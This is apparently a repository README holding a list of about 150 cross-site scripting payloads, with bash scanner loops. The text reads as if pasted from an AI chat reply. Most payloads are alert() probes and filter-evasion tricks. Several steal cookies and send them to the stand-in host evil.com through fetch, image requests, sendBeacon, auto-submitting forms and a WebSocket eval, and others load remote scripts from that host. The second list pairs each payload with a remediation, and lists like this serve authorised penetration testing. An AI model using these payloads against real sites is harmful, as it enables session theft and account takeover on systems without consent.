# XSS_payloads-
Below is a list of 100 critical XSS (Cross-Site Scripting) payloads that can be used to test web applications for vulnerabilities. These payloads cover a range of techniques—reflected, stored, and DOM-based XSS—targeting different contexts (HTML, attributes, JavaScript, etc.) and bypassing common filters. They’re designed to help identify weaknesses, but **use them only on systems you own or have explicit permission to test**, as unauthorized testing is illegal.

---

### Notes Before Using
- **Context Matters**: Payloads work differently depending on where they’re injected (e.g., HTML body, attribute, JavaScript string). Test in multiple input points.
- **Filters**: Some payloads bypass basic filters (e.g., blocking `<script>`); adapt them based on the target’s sanitization.
- **Tools**: Pair these with tools like Burp Suite or the `xss_scanner.sh` script from earlier for automated testing.

---

### 100 Critical XSS Payloads

#### Basic Payloads
1. `<script>alert('xss')</script>`
2. `<script>alert(1)</script>`
3. `<script>alert(document.cookie)</script>`
4. `"><script>alert('xss')</script>`
5. `<script src="http://evil.com/xss.js"></script>`

#### HTML Tag Variations
6. `<img src="x" onerror="alert('xss')">`
7. `<img src=javascript:alert('xss')>`
8. `<iframe src="javascript:alert('xss')"></iframe>`
9. `<svg onload="alert('xss')">`
10. `<body onload=alert('xss')>`
11. `<div onmouseover="alert('xss')">Hover me</div>`
12. `<input type="image" src="x" onerror="alert('xss')">`
13. `<link rel="stylesheet" href="javascript:alert('xss')">`
14. `<object data="javascript:alert('xss')">`
15. `<embed src="javascript:alert('xss')">`

#### Encoded Payloads
16. `%3Cscript%3Ealert('xss')%3C/script%3E` (URL-encoded `<script>`)
17. `&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;` (HTML entity)
18. `\x3Cscript\x3Ealert('xss')\x3C/script\x3E` (Hex escape)
19. `%253Cscript%253Ealert('xss')%253C/script%253E` (Double URL-encoded)
20. `<scr%ipt>alert('xss')</scr%ipt>` (Percent-encoded bypass)

#### Attribute-Based Payloads
21. `" onfocus="alert('xss')" autofocus`
22. `" onload="alert('xss')`
23. `" onclick="alert('xss')`
24. `" onmouseover="alert('xss')`
25. `<input value="xss" onblur="alert(this.value)">`
26. `<a href="javascript:alert('xss')">Click</a>`
27. `<img src="x" alt="x" onerror="alert('xss')">`
28. `<div style="xss:expr/*XSS*/ession(alert('xss'))">` (Old IE bypass)
29. `<input type="text" value="`"><script>alert('xss')</script>`">`
30. `<base href="javascript:alert('xss')//">`

#### JavaScript Context Payloads
31. `';alert('xss');//`
32. `";alert('xss');//`
33. `javascript:alert('xss')`
34. `eval('alert("xss")')`
35. `setTimeout("alert('xss')",1000)`
36. `Function('alert("xss")')()`
37. `new Function('alert("xss")')()`
38. `window.location='javascript:alert("xss")'`
39. `document.write('<script>alert("xss")</script>')`
40. `this['alert']('xss')`

#### Filter Evasion
41. `<scr<script>ipt>alert('xss')</scr</script>ipt>` (Nested tag bypass)
42. `<SCRIPT>alert('xss')</SCRIPT>` (Case variation)
43. `<sCrIpT>alert('xss')</ScRiPt>` (Mixed case)
44. `<<script>alert('xss');//<</script>` (Double tag)
45. `<script>alert('xss');</script` (Unclosed tag)
46. `<script>alert('xss')</script foo="bar">` (Extra attributes)
47. `<svg><script>alert('xss')</script></svg>`
48. `<script>/*comment*/alert('xss');</script>`
49. `<script defer>alert('xss')</script>`
50. `<script async>alert('xss')</script>`

#### Event Handlers
51. `<body onresize="alert('xss')">`
52. `<img src="x" onabort="alert('xss')">`
53. `<video src="x" onerror="alert('xss')">`
54. `<audio src="x" onended="alert('xss')">`
55. `<form onsubmit="alert('xss')">`
56. `<select onchange="alert('xss')">`
57. `<textarea onfocus="alert('xss')">`
58. `<button onclick="alert('xss')">Click</button>`
59. `<marquee onstart="alert('xss')">`
60. `<details ontoggle="alert('xss')">`

#### Advanced Payloads
61. `<meta http-equiv="refresh" content="0;url=javascript:alert('xss')">`
62. `<script src=//evil.com/xss.js></script>` (Protocol-relative URL)
63. `<img/src="x"/onerror=alert('xss')>` (No spaces)
64. `"><svg/onload=alert('xss')>`
65. `<math><maction actiontype="statusline#javascript:alert('xss')">Click</maction></math>`
66. `<isindex type=image src=1 onerror=alert('xss')>`
67. `<template><script>alert('xss')</script></template>`
68. `<noscript><script>alert('xss')</script></noscript>`
69. `<frameset><frame src="javascript:alert('xss')"></frameset>`
70. `<table background="javascript:alert('xss')">`

#### DOM-Based XSS
71. `location='javascript:alert("xss")'`
72. `window.name='alert("xss")';eval(window.name)`
73. `document.location.hash='javascript:alert("xss")'`
74. `history.pushState('','',`#<script>alert('xss')</script>`)`
75. `location.href='javascript:alert("xss")'`
76. `top["al"+"ert"]('xss')`
77. `self['alert']('xss')`
78. `parent.alert('xss')`
79. `opener.alert('xss')`
80. `document.cookie='xss='+alert('xss')`

#### Stealth Payloads
81. `<script>new Image().src='http://evil.com/log?'+document.cookie;</script>` (Cookie theft)
82. `<img src="x" onerror="fetch('http://evil.com/log?'+document.cookie)">`
83. `<script>window.onerror=alert;throw 'xss';</script>`
84. `<form action="javascript:alert('xss')"><input type=submit>`
85. `<input type="image" formaction="javascript:alert('xss')">`
86. `<script>console.log('xss');alert('xss');</script>` (Silent logging)
87. `<svg><animate onbegin="alert('xss')">`
88. `<keygen onerror="alert('xss')">`
89. `<bgsound src="x" onerror="alert('xss')">`
90. `<blink onload="alert('xss')">`

#### Miscellaneous
91. `data:text/html,<script>alert('xss')</script>`
92. `<script>alert(String.fromCharCode(88,83,83))</script>` (XSS in char codes)
93. `<script>alert(/xss/.source)</script>`
94. `<script>{alert('xss')}</script>`
95. `<script>eval(atob('YWxlcnQoJ3hzcycp'))</script>` (Base64: `alert('xss')`)
96. `<script>alert.call(null,'xss')</script>`
97. `<script>alert.apply(null,['xss'])</script>`
98. `<meta charset="x" content="text/html" onload="alert('xss')">`
99. `<script>Function("alert('xss')")()</script>`
100. `<script>setInterval("alert('xss')",1000)</script>` (Persistent alert)

---

### How to Use These Payloads
1. **Manual Testing**: Inject each payload into forms, URL parameters, headers, or search fields and check if it executes (e.g., an alert pops up).
2. **Automation**: Modify the `xss_scanner.sh` script to loop through these payloads:
   ```bash
   PAYLOADS=("payload1" "payload2" ...)
   for payload in "${PAYLOADS[@]}"; do
       test_url="${url}?q=${payload}"
       curl -s "$test_url" | grep -q "$payload" && echo "XSS Found: $payload"
   done
   ```
3. **Burp Suite**: Import the list into the Intruder tool for systematic testing.

---

### Tips for Effectiveness
- **Escape Special Characters**: URL-encode (`%3C` for `<`) or HTML-encode (`&#x3C;`) if filters block raw tags.
- **Combine Techniques**: Chain payloads (e.g., `<img src="x" onerror="alert('xss')">` with encoded versions).
- **Monitor Responses**: Look for reflections in HTML, JavaScript, or attributes, not just alerts.
- **Bypass Filters**: If `<script>` is blocked, try `<svg>`, `<img>`, or event handlers.

---


### 50 Advanced XSS Payloads

#### Filter Evasion with Obfuscation
1. `<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>`  
   - **Purpose**: Uses char codes to hide `alert('xss')` from keyword filters.  
   - **Fix**: Block `eval()` and sanitize JavaScript execution.

2. `<script>a='al';b='ert';window[a+b]('xss')</script>`  
   - **Purpose**: Splits `alert` to bypass blacklist filters.  
   - **Fix**: Prevent dynamic function calls with untrusted input.

3. `<script>window['\x61\x6c\x65\x72\x74']('xss')</script>`  
   - **Purpose**: Hex-encoded `alert` to evade string matching.  
   - **Fix**: Normalize input before processing.

4. `<svg><script><![CDATA[alert('xss')]]></script></svg>`  
   - **Purpose**: Uses CDATA to hide script from parsers.  
   - **Fix**: Strip or escape CDATA sections.

5. `<script>/*\u002a*/alert/*\u002a*/('xss')</script>`  
   - **Purpose**: Unicode comments bypass comment-stripping filters.  
   - **Fix**: Normalize Unicode before validation.

#### DOM-Based and Context-Specific
6. `javascript:document.body.innerHTML='<img src=x onerror=alert("xss")>'`  
   - **Purpose**: DOM manipulation via URL scheme.  
   - **Fix**: Block `javascript:` URLs with CSP.

7. `location.hash='#<script>alert("xss")</script>'`  
   - **Purpose**: Targets DOM-based XSS in hash-handling scripts.  
   - **Fix**: Sanitize `location.hash` before use.

8. `window.name='alert("xss")';eval(window.name)`  
   - **Purpose**: Exploits `window.name` persistence across domains.  
   - **Fix**: Avoid `eval()` and validate `window.name`.

9. `document.createElement('script').text='alert("xss")';document.body.appendChild(script)`  
   - **Purpose**: Dynamic script injection via DOM.  
   - **Fix**: Restrict script creation with CSP `script-src`.

10. `<input autofocus onfocus=eval(atob('YWxlcnQoJ3hzcycp'))>`  
   - **Purpose**: Base64-encoded `alert('xss')` triggered on focus.  
   - **Fix**: Block `eval()` and `atob()` with CSP.

#### Stealthy Exfiltration
11. `<img src="x" onerror="fetch('https://evil.com/log?c='+document.cookie)"/>`  
   - **Purpose**: Silently exfiltrates cookies via Fetch API.  
   - **Fix**: Set `HttpOnly` on cookies and use CSP `connect-src`.

12. `<script>new Image().src='https://evil.com/log?'+encodeURIComponent(document.cookie)</script>`  
   - **Purpose**: Exfiltrates cookies via image request.  
   - **Fix**: Same as above + monitor outbound requests.

13. `<form action="https://evil.com"><input name="c" value="'+document.cookie+'"><input type=submit id=s onload=s.click()>`  
   - **Purpose**: Auto-submits cookies via hidden form.  
   - **Fix**: Use CSRF tokens and `SameSite` cookies.

14. `<script>navigator.sendBeacon('https://evil.com',document.cookie)</script>`  
   - **Purpose**: Uses `sendBeacon` for stealthy data exfiltration.  
   - **Fix**: CSP `connect-src 'self'`.

15. `<iframe srcdoc="<script>parent.alert('xss')</script>">`  
   - **Purpose**: Executes in iframe, affecting parent.  
   - **Fix**: Use `sandbox` attribute on iframes.

#### Advanced Tag Abuse
16. `<svg><animate attributeName="href" values="javascript:alert('xss')" begin="0s"/>`  
   - **Purpose**: SVG animation triggers script.  
   - **Fix**: Block `javascript:` in attributes.

17. `<math href="javascript:alert('xss')">Click</math>`  
   - **Purpose**: Rare `math` tag with clickable script.  
   - **Fix**: Escape or block `href` attributes.

18. `<xmp><script>alert('xss')</script></xmp>`  
   - **Purpose**: Deprecated `xmp` tag may render raw content.  
   - **Fix**: Strip deprecated tags.

19. `<noembed><script>alert('xss')</script></noembed>`  
   - **Purpose**: Executes if `noembed` is mishandled.  
   - **Fix**: Remove or escape `noembed`.

20. `<plaintext><script>alert('xss')</script></plaintext>`  
   - **Purpose**: Old tag might bypass rendering.  
   - **Fix**: Block or escape `plaintext`.

#### Event Handler Tricks
21. `<div onpointerover="alert('xss')">Hover</div>`  
   - **Purpose**: Modern pointer event bypasses older filters.  
   - **Fix**: Whitelist allowed event handlers.

22. `<img src="x" onmousewheel="alert('xss')">`  
   - **Purpose**: Triggers on scroll over image.  
   - **Fix**: Same as above.

23. `<body onpageshow="alert('xss')">`  
   - **Purpose**: Executes when page is shown (e.g., back navigation).  
   - **Fix**: Limit event handlers in output.

24. `<input onpaste="alert('xss')" autofocus>`  
   - **Purpose**: Triggers on paste action.  
   - **Fix**: Sanitize event attributes.

25. `<details ontoggle="alert('xss')"><summary>Click</summary></details>`  
   - **Purpose**: Modern HTML5 tag with event.  
   - **Fix**: Escape dynamic attributes.

#### Filter Bypasses
26. `<scr<script>ipt>alert('xss')</scr</script>ipt>`  
   - **Purpose**: Nested tags confuse regex filters.  
   - **Fix**: Use a proper HTML parser for sanitization.

27. `<script/src="data:,alert('xss')"></script>`  
   - **Purpose**: Data URI as script source.  
   - **Fix**: CSP `script-src 'self'`.

28. `<script>alert.call(null,'xss')</script>`  
   - **Purpose**: Alternative `alert` invocation.  
   - **Fix**: Block dynamic function calls.

29. `<script>Object.defineProperty(window,'xss',{value:alert});xss('xss')</script>`  
   - **Purpose**: Redefines `alert` to evade detection.  
   - **Fix**: Restrict property manipulation.

30. `<script>with(window){alert('xss')}</script>`  
   - **Purpose**: `with` statement bypasses scope checks.  
   - **Fix**: Disable `with` in strict mode.

#### Polyglot Payloads
31. `<script>/*<![CDATA[*/alert('xss')/*]]>*/</script>`  
   - **Purpose**: Works in XML and HTML contexts.  
   - **Fix**: Normalize parsing across contexts.

32. `data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=`  
   - **Purpose**: Base64-encoded HTML with script.  
   - **Fix**: Block `data:` URLs with CSP.

33. `<svg><foreignObject><body onload=alert('xss')>`  
   - **Purpose**: SVG polyglot with HTML event.  
   - **Fix**: Sandbox SVG content.

34. `<script>alert('xss')//--></script>`  
   - **Purpose**: Works in HTML and XML parsers.  
   - **Fix**: Escape comments properly.

35. `<script src="javascript:alert('xss')"></script>`  
   - **Purpose**: Dual-purpose script source.  
   - **Fix**: Block `javascript:` in `src`.

#### Browser-Specific
36. `<style>@import 'javascript:alert("xss")';</style>` (Old Firefox)  
   - **Purpose**: CSS import trick.  
   - **Fix**: CSP `style-src 'self'`.

37. `<div style="xss:expression(alert('xss'))">` (Old IE)  
   - **Purpose**: IE-specific CSS expression.  
   - **Fix**: Modern browsers block this; ensure CSP.

38. `<script>mozBinding='javascript:alert("xss")'</script>` (Old Firefox)  
   - **Purpose**: Mozilla XBL binding.  
   - **Fix**: Obsolete, but CSP prevents.

39. `<meta http-equiv="X-UA-Compatible" content="IE=edge" onload=alert('xss')>`  
   - **Purpose**: Edge-case IE trigger.  
   - **Fix**: Strip invalid attributes.

40. `<script>chrome.runtime.sendMessage('alert("xss")')</script>` (Chrome extensions)  
   - **Purpose**: Targets extension contexts.  
   - **Fix**: Isolate extension scripts.

#### Timing and Persistence
41. `<script>setTimeout(()=>{alert('xss')},0)</script>`  
   - **Purpose**: Delayed execution evades immediate checks.  
   - **Fix**: Block `setTimeout` with untrusted input.

42. `<script>setInterval('alert("xss")',1000)</script>`  
   - **Purpose**: Persistent alerts.  
   - **Fix**: Same as above.

43. `<script>requestAnimationFrame(() => alert('xss'))</script>`  
   - **Purpose**: Animation-based trigger.  
   - **Fix**: Sanitize animation callbacks.

44. `<script>new MutationObserver(() => alert('xss')).observe(document.body,{childList:true})</script>`  
   - **Purpose**: Triggers on DOM changes.  
   - **Fix**: Restrict observer usage.

45. `<script>postMessage('alert("xss")','*');onmessage=e=>eval(e.data)</script>`  
   - **Purpose**: Message-based execution.  
   - **Fix**: Validate `postMessage` origins.

#### Extreme Edge Cases
46. `<script>throw new Error().stack.includes('xss')&&alert('xss')</script>`  
   - **Purpose**: Stack trace manipulation.  
   - **Fix**: Avoid stack trace reflection.

47. `<script>document.documentElement.setAttribute('onreset', 'alert("xss")');document.forms[0].reset()</script>`  
   - **Purpose**: Rare `onreset` event.  
   - **Fix**: Whitelist event attributes.

48. `<script>Object.prototype.toString='alert("xss")';''+{}</script>`  
   - **Purpose**: Prototype pollution.  
   - **Fix**: Prevent prototype tampering.

49. `<script>history.replaceState(null,null,'#<img src=x onerror=alert("xss")>')</script>`  
   - **Purpose**: History API abuse.  
   - **Fix**: Sanitize state data.

50. `<script>new WebSocket('ws://evil.com').onmessage=e=>eval(e.data);alert('xss')</script>`  
   - **Purpose**: WebSocket-based injection.  
   - **Fix**: CSP `connect-src 'self'`.

---

### How These Help with Fixing XSS
- **Detection**: These payloads reveal specific weaknesses (e.g., unescaped attributes, DOM misuse, filter gaps).
- **Fixes**: Each payload suggests a remediation:
  - **Escaping**: Use `htmlspecialchars()`, `encodeURIComponent()`, etc.
  - **CSP**: Implement strict `script-src`, `connect-src`, etc.
  - **Validation**: Whitelist inputs and attributes.
  - **Code Review**: Eliminate `eval()`, `innerHTML`, and dynamic execution.

---

### Using These Payloads
- **Manual**: Inject into forms, URLs, or headers and monitor for execution.
- **Script**: Update `xss_scanner.sh`:
  ```bash
  PAYLOADS=("<script>eval(String.fromCharCode(...))</script>" "...")
  for payload in "${PAYLOADS[@]}"; do
      test_url="${url}?q=${payload// /%20}" # URL-encode spaces
      curl -s "$test_url" | grep -q "$payload" && echo -e "${RED}XSS Found: $payload${NC}"
  done
  ```
- **Burp**: Load into Intruder for bulk testing.

---

If you meant “payloads to fix” as in tools or code snippets to patch XSS, let me know—I can provide server-side fixes (e.g., PHP escaping) or a more advanced scanner instead! What’s your next step?
